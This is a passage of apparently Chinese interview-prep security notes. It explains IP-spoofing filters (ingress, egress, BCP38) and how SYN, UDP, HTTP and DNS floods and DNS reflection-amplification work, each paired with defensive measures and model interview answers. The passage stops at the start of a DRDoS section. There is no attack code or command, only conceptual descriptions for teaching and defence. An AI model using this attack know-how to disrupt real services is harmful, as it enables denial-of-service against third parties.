</blockquote>
<p>于是你在路由器上设置 <strong>入口过滤规则</strong>，当接收到源地址为你网段的包却不是来自本地链路时，<strong>直接丢弃</strong>！</p>
<h4 id="✅-结果：">✅ 结果：</h4>
<ul>
<li>有效阻止外部攻击者伪装成你内部 IP 发送欺骗数据包。</li>
<li>防止攻击者借用内部信任关系实施攻击。</li>
</ul>
<h3 id="✅-2-出口过滤（Egress-Filtering）">✅ 2. 出口过滤（Egress Filtering）</h3>
<blockquote>
<p><strong>目的：</strong> 阻止“伪造源 IP”的本地用户数据包离开本地网络，用于防止向外发动攻击。</p>
</blockquote>
<h4 id="✅-举例：-3">✅ 举例：</h4>
<p>某个公司内网使用的是 <code>192.168.0.0/16</code> 地址段。某台中毒的主机准备向外网发动 SYN Flood 攻击，它构造的数据包源 IP 是 <code>8.8.8.8</code>（Google DNS），目标是某个海外服务器。</p>
<blockquote>
<p>❗ 问题：从公司内网发出的数据包源 IP 不应该是 <code>8.8.8.8</code>，这肯定是伪造的。</p>
</blockquote>
<p>于是边界路由器上启用 <strong>出口过滤规则</strong>：</p>
<ul>
<li>所有出口数据包的源地址必须是 <code>192.168.0.0/16</code> 范围内的 IP，否则丢弃。</li>
</ul>
<h4 id="✅-结果：-2">✅ 结果：</h4>
<ul>
<li>避免本地网络成为攻击“跳板”。</li>
<li>防止内网用户伪造外部 IP 发起攻击。</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=OTY0MTkzYTZkODA1ODE1NWEzOWMwZDQ1NjIyZGEyNGJfVWlOdDY2THNUVGdCNGxWYXNOMEp5MVA4NGswZFZ5ZmtfVG9rZW46UjN2WmI5U2VEb2M2Rll4aHUwZ2NaY1UwbmpjXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="✅-一、如果没有入口过滤会发生什么？">✅ 一、如果<strong>没有入口过滤</strong>会发生什么？</h2>
<h3 id="📌-问题场景-1：被外部攻击者“伪装内部-IP”绕过防火墙">📌 问题场景 1：被外部攻击者“伪装内部 IP”绕过防火墙</h3>
<h4 id="🔍-举例：">🔍 举例：</h4>
<p>你的企业内网为 <code>10.0.0.0/8</code>，你配置了内部防火墙规则：<strong>信任所有来自本地网段的 IP 地址访问核心业务系统</strong>。</p>
<blockquote>
<p>🔥 攻击者从公网伪造一个源 IP 为 <code>10.0.1.100</code> 的数据包，发往你的业务服务器，防火墙检查源 IP 合法，放行！</p>
</blockquote>
<p>❗结果：攻击者<strong>成功绕过防火墙</strong>，造成敏感系统暴露。</p>
<h3 id="📌-问题场景-2：反向攻击追踪失败">📌 问题场景 2：反向攻击追踪失败</h3>
<p>攻击者使用伪造的源 IP 向你网络内攻击，例如 DDoS。如果没有入口过滤，你无法通过源 IP 定位攻击者——<strong>源地址是假的</strong>！</p>
<p>❗结果：<strong>安全事件溯源困难，防御成本上升</strong>。</p>
<h2 id="✅-二、如果没有出口过滤会发生什么？">✅ 二、如果<strong>没有出口过滤</strong>会发生什么？</h2>
<h3 id="📌-问题场景-1：你的网络变成“僵尸跳板”">📌 问题场景 1：你的网络变成“僵尸跳板”</h3>
<p>假设你的内网某主机被木马感染，用伪造的源 IP（比如 <code>8.8.8.8</code>）不断向目标网站发起攻击（如 SYN Flood）。</p>
<p>如果没有出口过滤：</p>
<blockquote>
<p>🔥 这些攻击流量会顺利发送到外部，目标网站认为是 Google 在攻击他们。</p>
</blockquote>
<p>❗结果：</p>
<ul>
<li>你的网络 IP 被列入黑名单</li>
<li><strong>整个公司邮箱、服务访问国外网站受阻</strong></li>
<li>你为别人的攻击“背锅”</li>
</ul>
<h3 id="📌-问题场景-2：违反法规，遭到运营商警告或封锁">📌 问题场景 2：违反法规，遭到运营商警告或封锁</h3>
<p>运营商会监控异常数据流。如果你公司网络频繁发出源 IP 异常的数据包，可能会被<strong>限速、断网、调查</strong>。</p>
<h2 id="✅-总结答题模板（面试可用）：">✅ 总结答题模板（面试可用）：</h2>
<blockquote>
<p>没有入口过滤时，外部攻击者可以伪造源 IP 为内部 IP 绕过防火墙和访问控制规则，甚至在攻击后无法溯源。没有出口过滤时，内网被感染的主机可能伪造源 IP 发起攻击，让我们的网络成为“攻击跳板”，导致 IP 被封、业务受损。因此，两种过滤机制都是对抗 IP 欺骗的关键手段，企业级网络建议默认开启，配合 BCP38 标准执行。</p>
</blockquote>
<h3 id="SYN-Flood">SYN Flood</h3>
<h2 id="🧠-一句话理解-SYN-Flood-是什么？">🧠 一句话理解 SYN Flood 是什么？</h2>
<blockquote>
<p><strong>攻击者大量发送伪造的 SYN 请求，但不完成握手，导致服务器资源被白白占用，最终耗尽连接队列，无法服务正常请求。</strong></p>
</blockquote>
<h2 id="📶-TCP-三次握手回顾（正常流程）：">📶 TCP 三次握手回顾（正常流程）：</h2>
<ol>
<li>**客户端 → 服务器：**发送 <code>SYN</code>，表示“我要建立连接”</li>
<li>**服务器 → 客户端：**发送 <code>SYN-ACK</code>，表示“我收到你的请求，准备好了”</li>
<li>**客户端 → 服务器：**发送 <code>ACK</code>，表示“确认收到，连接建立成功”</li>
</ol>
<h2 id="🔥-SYN-Flood-的攻击方式：">🔥 SYN Flood 的攻击方式：</h2>
<p>攻击者发送海量伪造源 IP 的 <strong>SYN</strong> 包：</p>
<ul>
<li>服务器收到 SYN 后，<strong>回复 SYN-ACK</strong>，并为每个连接分配资源（如内核 socket 结构）</li>
<li>但由于源 IP 是假的，服务器<strong>永远收不到第三个 ACK</strong></li>
<li>连接一直处于“<strong>半开状态（SYN_RECV）</strong>”</li>
<li>系统的 <strong>半连接队列（Backlog）</strong> 很快被占满</li>
<li><strong>正常用户无法再建立连接，服务不可用</strong></li>
</ul>
<h2 id="🎯-举个现实例子（类比）：">🎯 举个现实例子（类比）：</h2>
<p>你是饭店老板（服务器），开门接客：</p>
<ul>
<li>每次客人来（SYN）你安排座位（分配资源）</li>
<li>但这些“客人”都是假的（IP 是伪造的）</li>
<li>你安排了一堆空桌子等他们落座（第三次握手）</li>
<li>结果他们一直不进来，<strong>你的位置满了，真正的客人来了你也没位置接待了</strong></li>
</ul>
<h4 id="三种常见攻击形式">三种常见攻击形式</h4>
<p>SYN Flood 攻击的<strong>三种常见形式</strong>：直接攻击、欺骗攻击、分布式攻击（DDoS）；</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjZjZjhkMTM0YmJmNjBkYzNjMWY1N2NmNjYyOGY5NjJfc0hwOE9WdXlCMGNqbEE3WVRyV3l2MkZ4OERwYmdjOXdfVG9rZW46UE1SU2J2NFd2bzdacHV4VG5CR2NpdzhFbnJmXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=NjBkMmNlY2FkMDZjMDljOThjNGIwYWE5YmU3MTQ4ODJfT3JFb0wxVWtZR1pScnluQ0hlc3o1WTVOWXVYYU9QdVpfVG9rZW46SFhSaGJ1ZUhxb2NzdFh4YTNHSmM4d3dMbmNmXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjA1ZTFhZDI3NmY1YmMwYzUyNTczMTdlZDg4YzhjODlfQUp0VU9tZzdJa01NbVIxM2xIaWNpZkF3ckJveDFZMmxfVG9rZW46RDhlM2JiMFdWb3VIQTF4VVdFc2NLR0hPbk1nXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h4 id="防御措施">防御措施</h4>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=NzBjNGM2YmI2YjE5Y2FiMzBiYmQxMjlkY2M5ZGQ3OThfcFFlbXEzMUhrV1Q3NUtSYU1IZm43bDFDYlF2MkFlOTFfVG9rZW46TlpRWGJJaTVWb3pPdlZ4TnNKWWN2ZWJEblVoXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=NjJjYTAyYWRkNjRkZWYwN2JiYzljZTljNjllZDdjMTVfMWNjckVzckJpVHVJOFhGOFBoNjRueW9ydkI4d3IyS0tfVG9rZW46WlA3Q2JUY1hib0d3UEV4V3VQTWNlMnRMbnNkXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=NzExZTFiYjcwYWVjN2Y3YmU3N2RkYjYyZWFkZGEyOGFfUGkwMFhqZUs3ZVdvdlM3dzdEcVA1UTFqNk9qbEdUNUlfVG9rZW46RDNTRWJWVEhzb0RoWk54UFM0R2NsNExGbkhnXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=OWMyODAyZDJiZGJmYzkzMjgwZTQ4MGI0YWYxYjZmYTlfamN0N2ZvYnY3anRwWFYwZXo3eGpzd2xHSzdjU1JMb1NfVG9rZW46Rkp4OGJON2g4b01MUkF4bGNLTmM3VEhrbmFnXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MDVhNWYxNmUyMGE5MzQ3MzU4NjgzNGRiNzY1MjFmMjhfN3BoaUJjN0VEQ1VRelptRnhaMkcyS0lFQjFyRVBsRm5fVG9rZW46SnRwbmJlb3pmb3MxUEp4cXlUQmNCV0JlbjNKXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h3 id="UDP-Flood">UDP Flood</h3>
<h3 id="UDP-Flood-攻击原理是什么？">UDP Flood 攻击原理是什么？</h3>
<p><strong>UDP Flood</strong> 主要通过利用服务器响应发送到其中一个端口的 <strong>UDP</strong> 数据包所采取的步骤。在正常情况下，当服务器在特定端口接收到 <strong>UDP</strong> 数据包时，会经过两个步骤：</p>
<ul>
<li>服务器首先检查是否正在运行正在侦听指定端口的请求的程序。</li>
<li>如果没有程序在该端口接收数据包，则服务器使用 <strong>ICMP</strong>（ping）数据包进行响应，以通知发送方目的地不可达。</li>
</ul>
<p><strong>UDP Flood</strong> 是一种常见的 DDoS（分布式拒绝服务）攻击方式，攻击者利用大量 UDP 数据包，向目标主机的多个端口发送请求，<strong>耗尽其带宽或系统资源</strong>，导致系统瘫痪或服务不可用。</p>
<h3 id="🧨-一、什么是-UDP-Flood-攻击？">🧨 一、什么是 UDP Flood 攻击？</h3>
<p>UDP 是一种无连接协议，发送数据时不需要三次握手确认。因此攻击者可以<strong>伪造源 IP 地址</strong>，快速、大量地发送 UDP 数据包给目标主机上的多个端口，系统必须为每个包检查：</p>
<ol>
<li>端口是否打开；</li>
<li>如果没有对应服务，操作系统将会发送一个 ICMP「端口不可达」报文（Port Unreachable）回源地址。</li>
</ol>
<p>这个过程会消耗：</p>
<ul>
<li>带宽（收发大量数据）</li>
<li>CPU（检查端口和响应）</li>
<li>内存（系统资源开销）</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=YTczYjA1MzZmZWMzOWQzZTdhNGI4OTVkNjYxNDYxYTRfaVpGSlBqcFB3RUtlN2FMTm9vSk5wc3ZvQ2lVZVNDcXZfVG9rZW46SXpWNWJNc0wwb0R1NDh4MDhQSGNlc3pYbnBoXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h3 id="🧨-举例与-UDP-Flood-对应解释">🧨 举例与 UDP Flood 对应解释</h3>
<p><strong>正常情况：</strong></p>
<ol>
<li>用户 A 给酒店打电话 → 想找小蓝</li>
<li>客服接到电话，查房间列表确认小蓝是否在</li>
<li>如果小蓝在且愿意接听，转接成功 ✅</li>
</ol>
<p><strong>攻击模拟：</strong></p>
<ul>
<li>攻击者伪造成成千上万不同的“用户”，同时打电话（UDP 包）</li>
<li>酒店客服（服务器）每次都要查房间 → <strong>消耗大量资源</strong></li>
<li>很多“用户”压根不是找小蓝，是乱打来的 → <strong>无效请求</strong></li>
<li>客服处理不过来，电话系统崩溃 → <strong>拒绝服务</strong></li>
</ul>
<p>这类比揭示了：</p>
<ul>
<li><strong>服务器资源有限</strong>，当被大量无意义请求淹没时，就会无法处理真正有效的用户请求；</li>
<li><strong>攻击者不需要建立真实连接（就像 UDP 无连接）</strong>，只需要发起足够多的请求；</li>
<li><strong>正常用户（真正想联系小蓝的人）被阻挡在外</strong>。</li>
</ul>
<h3 id="HTTP-Flood">HTTP Flood</h3>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MTVkNmNkOWM5ZjJkZGJkZTg1NzYyNzcxMzJkNWMxMWVfYTVTVUZ0NWRucmw2NEM2VVVOalNySUp4TTI4d0VUNktfVG9rZW46S2dPM2JsU2NFb2VPTkp4RjZpNGMweEkwbjdBXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MGU5ZGM3ZjU5NjJiODkyNDJiODlmMzFlODcxZTNlYTlfZUlBdUNZeDhRWkxjcjQ0bGFxeUFoSk81WlUwYndrU09fVG9rZW46UHFpMmI5Q2N4b3lUdU54bXZqWWNPaUlsbjFiXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h3 id="DNS-Flood">DNS Flood</h3>
<h3 id="DNS-Flood-攻击不同于-DNS-放大攻击">DNS Flood 攻击不同于 DNS 放大攻击:</h3>
<h2 id="🔍-一、DNS-Flood-攻击（洪水攻击）">🔍 一、DNS Flood 攻击（洪水攻击）</h2>
<h3 id="✅-核心特征：">✅ 核心特征：</h3>
<ul>
<li>直接<strong>大量请求 DNS 服务器</strong>，目的是让它**“忙不过来”**</li>
<li>不伪造 IP，不借助第三方，<strong>来源真实</strong></li>
<li>类似“打爆客服电话”：不停打进电话，占用资源，导致其他人打不进来</li>
</ul>
<h3 id="📌-举例说明：-2">📌 举例说明：</h3>
<p>攻击者控制一批设备（如肉鸡、僵尸网络），不停地对目标 DNS 服务器发起真实的请求，例如：</p>
<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">查询 <span class="string">``</span>www.a.com<span class="string">``</span>、<span class="string">``</span>www.b.com<span class="string">``</span>、<span class="string">``</span>www.c.com<span class="string">``</span> <span class="params">...</span></span><br></pre></td></tr></table></figure>
<p>不断请求大量不同域名，即使是不存在的域名，DNS 服务器也得花精力查找、响应，这就拖垮它的性能。</p>
<h3 id="🎯-攻击目的：">🎯 攻击目的：</h3>
<ul>
<li>占满服务器线程 / CPU / 内存</li>
<li>拖慢或阻断正常用户的域名解析服务</li>
</ul>
<h2 id="💥-二、DNS-放大攻击（Amplification）">💥 二、DNS 放大攻击（Amplification）</h2>
<h3 id="✅-核心特征：-2">✅ 核心特征：</h3>
<ul>
<li><strong>伪造源 IP</strong>（伪装成受害者 IP）</li>
<li>向大量开放的 DNS 服务器发送小请求，利用这些服务器<strong>反射+放大</strong>回大量响应</li>
<li>属于<strong>反射型 + 放大型攻击</strong></li>
</ul>
<h3 id="📌-举例说明：-3">📌 举例说明：</h3>
<ol>
<li>攻击者向一台 <strong>开放的 DNS 服务器</strong> 发送一个查询请求，查询内容为 DNSSEC 类型，响应内容非常大（比如 3000 字节），但请求包中伪造了源 IP：<strong>受害者的 IP</strong></li>
<li>DNS 服务器将<strong>响应回发到受害者 IP</strong></li>
<li>攻击者重复这个过程，用几百台 DNS 服务器同时操作</li>
<li>结果：受害者被巨量“DNS 响应”数据包淹没，服务器带宽被打满</li>
</ol>
<h3 id="📈-放大倍率：">📈 放大倍率：</h3>
<ul>
<li>请求 60 字节，响应 3000 字节 = <strong>50x 放大</strong></li>
<li>攻击者只需要少量带宽，就能发动大流量攻击</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ODJkMmI0MTcxMWUyZTA3MWE3NTY1MGFjZDBkNWI1NTBfVm5CUEZZeGw0SVRKbzllalFHQ2RUUHNTSHlrZlAwbnRfVG9rZW46WVMzNWJPbzljb2JtS2l4dWZHcmNsUmhjbmVqXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MzU2MWJiY2FjMDQyZTQzYWFhMWMyYjc3NTBiNDAzZDhfMmNwcm1DT1BGQTl5NjhLeEliejFEWFJWRmp5M0dJTnJfVG9rZW46WkVBOWJESXlIb0hwREt4N2txMWNYT3I1blJjXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h4 id="防护策略">防护策略</h4>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=YWFiN2E1YmM3NTI4Zjk2ZDkwZWFlMGUzOGViNTk1Y2VfYWFFNHVxSWJQWHhDVkY4dGcxc2VZM0kyRDdEdWxNVFFfVG9rZW46WkN4ZmJrblJHb01uSm94QjdISmNFMDhubk1NXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MGZiM2UzY2IyYTJlMmFiZTVmYmVjZjdmYmE0MjEyNjFfcElvamN0TFBUWTBiNmx6VDY1RlZGWDRsVTNJZ3puNmhfVG9rZW46WkVuUWJyeTNVb1hJRGd4R0IwUmNITExqbmZnXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=NGFjYTkyMDY5YmZhMzM4YmJkNzhlOWZmMTU3ZDE2M2VfdGpjcGNYa1NHd3B6NXlDMU95ZmQwQ2Z1b0pxNWlWYmtfVG9rZW46WmJlOWJUcVRFb0dFamx4QlJ5aGNBd0UxbjhqXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h3 id="四种常见-DDoS（分布式拒绝服务）-攻击类型-及其-防护策略总结">四种常见 <strong>DDoS（分布式拒绝服务） 攻击类型</strong> 及其 <strong>防护策略</strong>总结</h3>
<h3 id="四种常见-DDoS-攻击类型-及其-防护策略-的标准回答模板">四种常见 <strong>DDoS 攻击类型</strong> 及其 <strong>防护策略</strong> 的标准回答模板</h3>
<h2 id="✅-面试高频问：请简要说明-SYN-Flood、UDP-Flood、HTTP-Flood、DNS-Flood-的攻击原理与防护措施。">✅ 面试高频问：请简要说明 SYN Flood、UDP Flood、HTTP Flood、DNS Flood 的攻击原理与防护措施。</h2>
<h3 id="一、SYN-Flood-攻击">一、SYN Flood 攻击</h3>
<p><strong>原理</strong>：</p>
<ul>
<li>利用 TCP 三次握手机制，攻击者大量发送 SYN 请求但不完成握手，造成服务器半连接堆积，资源耗尽。</li>
</ul>
<p><strong>防护策略</strong>：</p>
<ol>
<li><strong>SYN Cookie</strong>：不真正分配资源，延后分配直到握手完成；</li>
<li><strong>缩短 SYN Timeout</strong>：减少半连接资源占用时间；</li>
<li><strong>连接限速</strong>：限制单 IP 每秒 TCP 新建连接数量；</li>
<li><strong>防火墙 + WAF + CDN</strong>：识别并拦截异常 SYN 流量；</li>
<li><strong>IP 黑名单机制</strong>：识别恶意 IP 并封禁。</li>
</ol>
<h3 id="二、UDP-Flood-攻击">二、UDP Flood 攻击</h3>
<p><strong>原理</strong>：</p>
<ul>
<li>利用 UDP 无连接、无状态的特点，大量发送伪造或随机端口的数据包，目标主机频繁响应 ICMP 不可达，占用带宽与处理资源。</li>
</ul>
<p><strong>防护策略</strong>：</p>
<ol>
<li><strong>限制 ICMP 响应速率</strong>：防止被拖入资源消耗；</li>
<li><strong>丢弃无意义的 UDP 请求</strong>：如高频无目的端口请求；</li>
<li><strong>封堵异常 UDP 源头 IP 或端口</strong>；</li>
<li><strong>流量清洗</strong>：使用云清洗服务过滤异常流量；</li>
<li><strong>部署 DPI（深度包检测）网关</strong>：识别非正常 UDP 流量特征。</li>
</ol>
<h3 id="三、HTTP-Flood-攻击">三、HTTP Flood 攻击</h3>
<p><strong>原理</strong>：</p>
<ul>
<li>通过高频率发送合法的 HTTP 请求（如 GET、POST），耗尽 Web 服务器资源，导致服务无法响应正常用户请求。</li>
</ul>
<p><strong>防护策略</strong>：</p>
<ol>
<li><strong>限流 + 验证机制</strong>：开启验证码、人机识别；</li>
<li><strong>WAF（Web 应用防火墙）</strong>：过滤异常 UA、Referer、访问频率；</li>
<li><strong>缓存静态资源（如 CDN）</strong>：减少服务器负载；</li>
<li><strong>POST 请求保护</strong>：对敏感表单添加 Token 验证、频控；</li>
<li><strong>分析用户行为</strong>：识别并拦截非人类流量。</li>
</ol>
<h3 id="四、DNS-Flood-攻击">四、DNS Flood 攻击</h3>
<p><strong>原理</strong>：</p>
<ul>
<li>大量对某 DNS 域名或服务器的请求，让 DNS 服务器超负荷，导致解析失败，影响用户访问网站。</li>
</ul>
<p><strong>防护策略</strong>：</p>
<ol>
<li><strong>限速</strong>：单 IP 请求频率限制；</li>
<li><strong>Anycast DNS（分布式 DNS）</strong>：提升容灾与抗压能力；</li>
<li><strong>部署 CDN</strong>：将解析压力分散到边缘；</li>
<li><strong>行为识别</strong>：检测并封禁异常访问源；</li>
<li><strong>使用 DNS 云防护平台（如 Cloudflare DNS）</strong>。</li>
</ol>
<h3 id="✅-加分建议（如面试允许你多说两句）：">✅ 加分建议（如面试允许你多说两句）：</h3>
<blockquote>
<p>“除了 Flood 攻击，如果是 DNS 放大攻击，还涉及到 IP 欺骗和响应放大，这时我们还要配置 BCP38 出口过滤、关闭递归 DNS、防止被当成‘放大器’。”</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=NTI4YjRmZDQ2NTI3ZjU4MTAyZDU2NmVhNGE4Yzg2ZDNfb0l0N3NEdHdjVzVCd0U3VmJCZUVlV3RmbUlyTmU2UHdfVG9rZW46U2U1UGJuN1l4b2FFaVh4aEpDemNHQU40bnpoXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h3 id="如何应对-DDoS-攻击？">如何应对 DDoS 攻击？</h3>
<h4 id="1、高防服务器">1、高防服务器</h4>
<p>还是拿开的重庆火锅店举例，高防服务器就是我给重庆火锅店增加了两名保安，这两名保安可以让保护店铺不受流氓骚扰，并且还会定期在店铺周围巡逻防止流氓骚扰。</p>
<p>高防服务器主要是指能独立硬防御 50Gbps 以上的服务器，能够帮助网站拒绝服务攻击，定期扫描网络主节点等，这东西是不错，就是贵~</p>
<h4 id="2、黑名单">2、黑名单</h4>
<p>面对火锅店里面的流氓，我一怒之下将他们拍照入档，并禁止他们踏入店铺，但是有的时候遇到长得像的人也会禁止他进入店铺。这个就是设置黑名单，此方法秉承的就是“错杀一千，也不放一百”的原则，会封锁正常流量，影响到正常业务。</p>
<h4 id="3、DDoS-清洗">3、DDoS 清洗</h4>
<p><strong>DDos</strong> 清洗，就是我发现客人进店几分钟以后，但是一直不点餐，我就把他踢出店里。</p>
<p><strong>DDoS</strong> 清洗会对用户请求数据进行实时监控，及时发现 <strong>DOS</strong> 攻击等异常流量，在不影响正常业务开展的情况下清洗掉这些异常流量。</p>
<h4 id="4、CDN-加速">4、CDN 加速</h4>
<p>CDN 加速，我们可以这么理解：为了减少流氓骚扰，我干脆将火锅店开到了线上，承接外卖服务，这样流氓找不到店在哪里，也耍不来流氓了。</p>
<p>在现实中，CDN 服务将网站访问流量分配到了各个节点中，这样一方面隐藏网站的真实 IP，另一方面即使遭遇 <strong>DDoS</strong> 攻击，也可以将流量分散到各个节点中，防止源站崩溃</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=YTQxZGIzYTRhNDZkMDYzMDUxYmVlY2JmNzEzNGFhNjBfZkdCdnZ5RGRZcDF2eFpvMXRuVkpSaWNETnF0bUprb0tfVG9rZW46VDNLcGI3WGVtb3hDbGJ4VlBjR2NURFB0bjNmXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h3 id="🧾-二、面试回答模板（以-DNS-Flood-和-DNS-放大为例）：">🧾 二、面试回答模板（以 DNS Flood 和 DNS 放大为例）：</h3>
<h4 id="📌-面试官：你怎么防护-DNS-Flood-和-DNS-放大攻击？">📌 面试官：你怎么防护 DNS Flood 和 DNS 放大攻击？</h4>
<p>你可以这样答：</p>
<blockquote>
<p>DNS 类攻击我会分两类来看：Flood 攻击主要针对 DNS 服务器本身，放大攻击则是利用开放 DNS 服务器攻击第三方目标。</p>
<ul>
<li>对 <strong>DNS Flood</strong>，我会：
<ul>
<li><strong>限流（Rate Limiting）</strong>：对同一 IP 或域名的请求频率做限制，防止刷爆；</li>
<li><strong>分布部署（Anycast DNS）</strong>：使用分布式节点分担压力；</li>
<li><strong>异常识别</strong>：用日志系统分析异常 IP、请求特征，快速拉黑；</li>
<li><strong>接入云防护</strong>：比如 Cloudflare、阿里云 DNS，具备实时清洗能力。</li>
</ul>
</li>
<li>对 <strong>DNS 放大攻击</strong>，我会：
<ul>
<li><strong>关闭递归解析</strong>：防止 DNS 被外部用作攻击“放大器”；</li>
<li><strong>开启响应限制（RRL）</strong>：限制响应速率；</li>
<li><strong>BCP38 过滤伪 IP 包</strong>：从边界处阻断伪造的源地址；</li>
<li><strong>最小响应原则</strong>：避免返回过大的 DNS 响应内容。</li>
</ul>
</li>
</ul>
</blockquote>
<h3 id="🧠-三、口诀辅助记忆法：">🧠 三、口诀辅助记忆法：</h3>
<h4 id="DNS-Flood（攻击我）：">DNS Flood（攻击我）：</h4>
<blockquote>
<p><strong>识限引散防</strong></p>
</blockquote>
<ul>
<li><strong>识</strong> 异常行为 → 限请求速率 → 引入云清洗 → 散部署节点 → 防火墙/高可用</li>
</ul>
<h4 id="DNS-放大（我被滥用）：">DNS 放大（我被滥用）：</h4>
<blockquote>
<p><strong>关递缩放伪</strong></p>
</blockquote>
<ul>
<li><strong>关</strong>递归解析 → <strong>缩</strong>小响应 → <strong>防</strong>伪源 IP（BCP38） → 限速防放大</li>
</ul>
<h3 id="DRDoS">DRDoS</h3>
<p>DRDoS（<strong>Distributed Reflection Denial of Service</strong>，<strong>分布式反射拒绝服务攻击</strong>）是一种<strong>升级版的 DDoS 攻击</strong>，其核心在于利用 <strong>第三方服务器或服务进行“反射”</strong>，将大量数据包“反射”给目标主机，实现对目标的<strong>放大攻击和拒绝服务</strong>。</p>
